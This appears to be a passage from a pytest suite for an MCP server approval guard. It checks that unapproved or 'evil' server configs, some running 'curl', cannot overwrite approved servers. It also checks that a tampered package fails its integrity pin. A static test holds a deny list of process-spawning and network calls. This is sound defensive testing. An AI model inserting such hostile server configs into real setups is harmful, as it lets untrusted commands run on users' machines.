    for method, url, body in (('put', f'/api/mcp/project/{PKG}', evil), ('post', '/api/mcp', {**evil, 'name': PKG, 'scope': 'project'})):
        r = getattr(env.client, method)(url, json=body)
        assert r.status_code in (400, 409) and 'approved in Desk Connect' in r.get_json()['error']
    assert servers(env.proj_cfg) == before


def test_a_project_entry_cannot_shadow_an_approved_global_server(env):
    approved(env, scope='global', project_id=None)
    r = env.client.post('/api/mcp', json={'name': PKG, 'transport': 'stdio', 'scope': 'project', 'project_id': 'other',
                                          'config': {'command': 'curl'}, 'passcode': PASSCODE})
    assert r.status_code in (400, 409) and 'approved in Desk Connect' in r.get_json()['error']
    assert not (env.tmp / 'other' / '.mcp.json').exists()


def test_the_url_installer_cannot_write_over_an_approved_server(env):
    approved(env)
    before = servers(env.proj_cfg)
    r = env.client.post('/api/mcp/url/install', json={'name': PKG, 'scope': 'project', 'project_id': PID,
                                                      'config': {'command': 'curl', 'args': ['x']}, 'passcode': PASSCODE})
    assert 'approved in Desk Connect' in r.get_data(as_text=True)
    assert servers(env.proj_cfg) == before


def test_the_catalogue_cannot_take_the_name_of_an_approved_global_server(env):
    approved(env, scope='global', project_id=None, server_name='notion')
    entry = mcp_catalogue.for_service('notion')
    assert entry['server_name'] == 'notion'
    clash = mcp_activation.conflict(entry)
    assert clash is not None and clash.code == 'server_exists'
    os.remove(env.glob_cfg)                                              # the record still owns the name
    assert mcp_activation.conflict(entry) is not None


def test_deleting_an_approved_server_in_the_panel_releases_its_name(env):
    approved(env)
    assert env.client.delete(f'/api/mcp/project/{PKG}?project_id={PID}').status_code == 200
    assert store.all_records() == [] and PKG not in servers(env.proj_cfg)
    r = env.client.post('/api/mcp', json={'name': PKG, 'transport': 'stdio', 'scope': 'project', 'project_id': PID,
                                          'config': {'command': 'node', 'args': ['x.js']}, 'passcode': PASSCODE})
    assert r.status_code == 201


def test_servers_desk_never_approved_are_still_written_by_the_older_paths(env):
    r = env.client.post('/api/mcp', json={'name': 'plain', 'transport': 'stdio', 'scope': 'global',
                                          'config': {'command': 'node', 'args': ['x.js']}, 'passcode': PASSCODE})
    assert r.status_code == 201 and 'plain' in servers(env.glob_cfg)


def test_a_server_that_is_there_and_was_not_approved_is_never_replaced(env):
    from mc import mcp
    mcp.write_server(PKG, 'stdio', {'command': 'node', 'args': ['mine.js']}, 'project', project_path=str(env.proj_dir),
                     project_id=PID)
    r = review(env)
    assert r.status_code == 409 and r.get_json()['code'] == 'server_exists'
    assert servers(env.proj_cfg)[PKG]['args'] == ['mine.js'] and store.all_records() == []


def test_a_server_that_appears_between_review_and_save_is_not_overwritten(env):
    from mc import mcp
    card = review(env).get_json()
    mcp.write_server(PKG, 'stdio', {'command': 'node', 'args': ['mine.js']}, 'project', project_path=str(env.proj_dir),
                     project_id=PID)
    r = save(env, card)
    assert r.status_code == 409 and r.get_json()['code'] == 'server_exists'
    assert servers(env.proj_cfg)[PKG]['args'] == ['mine.js'] and store.all_records() == []


# ── the shape of the code ────────────────────────────────────────────────────

NEW_MODULES = ('custom_npm_artifact', 'custom_connection_operation', 'custom_connection_store',
               'custom_connection_activation', 'custom_connection_service', 'custom_connection_guard')


def test_no_new_module_starts_a_process_or_runs_npm():
    for name in NEW_MODULES:
        text = (REPO / 'mc' / 'desk_connect' / f'{name}.py').read_text(encoding='utf-8')
        tree = ast.parse(text)
        for n in ast.walk(tree):
            if isinstance(n, ast.Import):
                assert not {a.name for a in n.names} & {'subprocess', 'socket', 'urllib.request'}, name
            if isinstance(n, ast.ImportFrom):
                assert n.module not in ('subprocess', 'socket', 'urllib.request'), name
            if isinstance(n, ast.Attribute):
                assert n.attr not in ('Popen', 'system', 'popen', 'urlopen', 'extractall'), (name, n.attr)


def test_the_legacy_mcp_layer_calls_the_guard_in_write_and_delete():
    text = (REPO / 'mc' / 'mcp.py').read_text(encoding='utf-8')
    assert text.count('_desk_guard.check_write(') == 1 and text.count('_desk_guard.released(') == 2


def test_the_operation_holds_names_only():
    op = operation.build(
        {'package': PKG, 'version': '1.2.3', 'integrity': 'sha512-' + 'A' * 86 + '==', 'tarball': _url('1.2.3'),
         'entry': 'bin/cli.mjs'},
        {'args': ['a'], 'credentials': [{'env': 'ACME_TOKEN', 'vault': 'acme.token'}], 'server_name': PKG,
         'scope': 'global', 'project_id': None})
    assert operation.fingerprint(op).startswith('sha256:') and op['install_steps'] == []
    assert set(op['credentials'][0]) == {'env', 'vault'}
    assert activation.wrapper_flags(op)[-1] == '--' and '--env' in activation.wrapper_flags(op)


def test_a_change_that_failed_to_install_leaves_the_approved_server_and_can_be_retried(env):
    approved(env)
    old = servers(env.proj_cfg)[PKG]
    env.reg.publish('1.2.4')
    card = review(env, package=f'{PKG}@1.2.4').get_json()
    env.reg.served[_url('1.2.4')] = _tar(_good('1.2.4', extra='tampered'))
    out = save(env, card).get_json()
    assert out['state'] == 'setup_failed' and out['code'] == 'pin_mismatch'
    assert servers(env.proj_cfg)[PKG] == old                              # the approved line is untouched
    del env.reg.served[_url('1.2.4')]
    again = save(env, card).get_json()
    assert again['state'] == 'registered' and servers(env.proj_cfg)[PKG] != old
    assert 'replaces' not in store.all_records()[0]
